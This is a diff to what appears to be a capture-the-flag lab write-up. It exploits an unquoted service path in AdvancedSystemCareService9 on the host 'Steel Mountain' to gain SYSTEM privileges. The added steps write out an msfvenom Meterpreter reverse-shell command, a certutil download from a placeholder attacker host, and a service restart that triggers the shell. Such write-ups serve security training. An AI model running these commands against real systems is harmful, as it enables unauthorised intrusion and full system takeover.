@@ -55,14 +55,43 @@ This can be enumerated by the command ``` wmic service get name,pathname | finds
 The service named "AdvancedSystemCareService9" is further enumerated to check if privilege escalation via unquoted service path can be done. 
 
 Under the current username STEELMOUNTAIN\bill, there are two key requirements:
-a) STEELMOUNTAIN\bill must be able to write in a subdirectory of the service image path "C:\Program Files (x86)\IOBit\Advanced SystemCare\ASCService.exe", where there is a space within that breaks the full service path.
-b) STEELMOUNTAIN\bill must be able to start/stop the service "AdvancedSystemCareService9"
+- STEELMOUNTAIN\bill must be able to write in a subdirectory of the service image path "C:\Program Files (x86)\IOBit\Advanced SystemCare\ASCService.exe", where there is a space within that breaks the full service path.
+- STEELMOUNTAIN\bill must be able to start/stop the service "AdvancedSystemCareService9"
 
-For (a) using icacls to check permissions from this image path in top-down manner, it is observed that the directory "C:\Program Files (x86)\IOBit\" has permissions for STEELMOUNTAIN\bill to write into it. 
+Firstly, using ```icacls``` to check permissions from this image path in top-down manner, it is observed that the directory "C:\Program Files (x86)\IOBit\" has permissions for STEELMOUNTAIN\bill to write into it. 
 <img width="972" height="532" alt="image" src="https://github.com/user-attachments/assets/bdbbdf71-2c3c-46a2-b6d5-e3c22b5fd34a" />
 Therefore, due to the unquoted string and space, the filename which be executed will append .exe at the end of the path. 
 In this case, it can be executed as "C:\Program Files (x86)\IOBit\Advanced.exe".
 
+Secondly, user STEELMOUNTAIN\bill can stop/start the service "AdvancedSystemCareService9" using ```sc start AdvancedSystemCareService9``` and ```sc stop AdvancedSystemCareService9```
+
 ### 3.2. privilege escalation using unquoted service path exploit
+A Meterpreter reverse shell payload which is a portable executable file named Advanced.exe can be generated using ```msfvenom -p windows\x64\meterpreter\reverse_tcp LHOST=X.X.X.X LPORT=XXXX -f exe > Advanced.exe ```
+<img width="900" height="152" alt="image" src="https://github.com/user-attachments/assets/0102e487-8f21-437d-bdac-0400de8f7d7e" />
+
+
+From the attacker's machine, this payload served using ```python -m http.server 8000``` 
+<img width="564" height="171" alt="image" src="https://github.com/user-attachments/assets/ac626158-e1d4-4381-b8e7-176be060caf4" />
+
+From the victim's machine, the payload can be downloaded using ```certutil -urlcache -f http://X.X.X.X/Advanced.exe Advanced.exe```
+<img width="1213" height="354" alt="image" src="https://github.com/user-attachments/assets/aa34742e-aae3-4827-91af-ea9ad2861b6e" />
+
+
+Then, the downloaded Advanced.exe can be copied to directory "C:\Program Files (x86)\IOBit\":
+<img width="1134" height="97" alt="image" src="https://github.com/user-attachments/assets/3b91cac9-9119-4f3f-bc52-ca994bdd06fe" />
+
+
+On the attacker's machine, a listener with the approriate LHOST, LPORT and payload options are set up and then ran 
+
+<img width="809" height="368" alt="image" src="https://github.com/user-attachments/assets/853e0541-7893-4bd3-ba39-c983c8a0d7c5" />
+
+
+From the victim's machine, stop and start the service
+<img width="962" height="189" alt="image" src="https://github.com/user-attachments/assets/949e1bb5-f359-4e12-90ab-b353b4366af7" />
+
+
+Therefore on the attacker's listener, a reverse shell with privileged-level user NT Authority\System was obtained as per below screenshot
+<img width="873" height="332" alt="image" src="https://github.com/user-attachments/assets/2f097414-a43c-496a-9942-5e35acab6ad4" />
+
 
 
